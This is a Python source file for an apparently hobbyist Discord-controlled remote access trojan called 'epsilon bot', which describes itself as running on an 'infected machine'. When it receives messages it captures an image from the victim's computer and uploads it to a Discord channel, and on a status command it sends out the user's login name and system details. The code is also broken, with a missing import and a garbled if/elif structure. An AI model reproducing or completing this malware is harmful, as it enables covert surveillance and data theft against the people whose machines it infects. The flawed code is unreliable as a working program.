import discord
import asyncio
from payloads.satelite import collectimage
import os
import platform

bot_token = ""

machine_data = platform.uname()

def init_bot(token):
    global bot_token
    bot_token = token


e_bot = discord.Client()
@e_bot.event
async def on_ready():
    await e_bot.change_presence(game=discord.Game(name=os.getlogin()))
    
    
@e_bot.event
async def on_message(message):
    if sys.platform == "win32":
        path =  os.path.expandvars("%userprofile%") +'\\Documents\\'
    else:
        path = os.path.expanduser('~')
       
        print(path)

        if collectimage():
            await e_bot.send_file(message.channel,path+'tempic.png')
        else:
            await e_bot.send_message(message.channel,"[Error] : Couldn't grab pic :( ")
    elif message.content.startswith('$status'):
        await e_bot.send_message(message.channel,"Hello i'm epsilon bot by Sreyas i'm currently speaking from infected machine " + os.getlogin())
        buffer_data = "```System : " + machine_data[0] + "\nNode : " + machine_data[1] + "\nRelease : " + machine_data[2] + "\nVersion : " + machine_data[3] + "\nMachine : " + machine_data[4] + "\nProcessor : " + machine_data[5] +"```"
        await e_bot.send_message(message.channel,buffer_data)
       
def runbot():
    e_bot.run(bot_token)


